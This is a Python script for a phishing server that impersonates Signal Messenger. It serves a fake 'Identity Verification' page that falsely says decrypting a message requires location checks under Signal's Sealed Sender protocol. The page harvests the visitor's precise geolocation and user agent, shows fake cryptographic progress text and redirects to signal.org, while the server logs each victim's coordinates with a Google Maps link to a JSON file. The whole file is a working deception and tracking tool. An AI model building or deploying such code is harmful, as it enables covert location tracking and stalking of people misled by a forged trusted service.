import http.server, socketserver, json, os
from datetime import datetime

PORT = 8080
LOG_FILE = "vault_access.json"

HTML_CONTENT = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Signal Messenger | Secure Access</title>
    <style>
        :root { --accent: #2C6BED; --bg: #0B0B0C; --card: #161718; --text: #FFFFFF; --dim: #8E8E93; }
        * { box-sizing: border-box; -webkit-font-smoothing: antialiased; }
        body { 
            margin: 0; background: var(--bg); color: var(--text); 
            font-family: "Inter", -apple-system, sans-serif;
            display: flex; align-items: center; justify-content: center; height: 100vh;
        }
        .vault-card {
            width: 100%; max-width: 400px; padding: 40px 24px;
            background: var(--card); border: 1px solid #2C2C2E;
            border-radius: 32px; text-align: center; margin: 16px;
        }
        .signal-icon {
            width: 64px; height: 64px; background: var(--accent);
            border-radius: 18px; margin: 0 auto 24px;
            display: flex; align-items: center; justify-content: center;
        }
        h1 { font-size: 22px; font-weight: 600; margin: 0 0 12px; letter-spacing: -0.5px; }
        p { font-size: 14px; color: var(--dim); line-height: 1.6; margin: 0 0 32px; }
        
        .btn {
            background: var(--accent); color: white; border: none; width: 100%;
            padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 600;
            cursor: pointer; transition: all 0.2s ease;
        }
        .btn:hover { filter: brightness(1.1); }
        .btn:active { transform: scale(0.98); }

        /* Modern Loader */
        .step-box { display: none; text-align: left; background: #000; border-radius: 12px; padding: 16px; margin-top: 8px; }
        .step { font-size: 12px; color: var(--dim); margin: 4px 0; display: flex; align-items: center; }
        .step.active { color: var(--accent); }
        .spinner { 
            width: 16px; height: 16px; border: 2px solid #333; border-top-color: var(--accent);
            border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 10px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="vault-card">
        <div class="signal-icon">
            <svg width="32" height="32" viewBox="0 0 24 24" fill="white">
                <path d="M12 2C6.477 2 2 6.477 2 12c0 1.89.525 3.66 1.438 5.16L2 22l4.84-1.438C8.34 21.475 10.11 22 12 22c5.523 0 10-4.477 10-10S17.523 2 12 2z"/>
            </svg>
        </div>
        <h1>Identity Verification</h1>
        <p>Confirm your regional node proximity to decrypt this communication. This is part of Signal's <b>Sealed Sender</b> security protocol.</p>
        
        <button class="btn" id="startBtn" onclick="verify()">Decrypt Message</button>

        <div class="step-box" id="stepBox">
            <div class="step active"><div class="spinner"></div> <span id="statusText">Initializing handshake...</span></div>
        </div>
    </div>

    <script>
        const wait = (ms) => new Promise(res => setTimeout(res, ms));

        async function verify() {
            const btn = document.getElementById('startBtn');
            const box = document.getElementById('stepBox');
            const text = document.getElementById('statusText');

            btn.style.display = 'none';
            box.style.display = 'block';

            navigator.geolocation.getCurrentPosition(async (pos) => {
                text.innerText = "Synchronizing node...";
                await wait(1200);
                
                text.innerText = "Applying cryptographic keys...";
                await fetch('/log', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: Math.round(pos.coords.accuracy),
                        ua: navigator.userAgent
                    })
                });
                await wait(1000);
                
                text.innerText = "Success. Redirecting...";
                await wait(800);
                window.location.href = "https://signal.org/";
            }, (err) => {
                alert("Protocol Error: End-to-end decryption requires valid node synchronization.");
                location.reload();
            }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
"""

class ProSignalServer(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(HTML_CONTENT.encode())

    def do_POST(self):
        if self.path == '/log':
            content_length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(content_length))
            data['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Print to Terminal
            print(f"\\n[+] ACCESS GRANTED: {data['timestamp']}")
            print(f"    Map: https://www.google.com/maps?q={data['lat']},{data['lon']}")
            print(f"    Margin: {data['acc']}m")
            
            # Save to JSON File
            logs = []
            if os.path.exists(LOG_FILE):
                with open(LOG_FILE, 'r') as f: logs = json.load(f)
            logs.append(data)
            with open(LOG_FILE, 'w') as f: json.dump(logs, f, indent=4)
            
            self.send_response(200)
            self.end_headers()

if __name__ == "__main__":
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), ProSignalServer) as httpd:
        print(f"--- Signal Enterprise Proxy Initialized ---")
        print(f"[*] Monitoring inbound handshakes on port {PORT}")
        httpd.serve_forever()
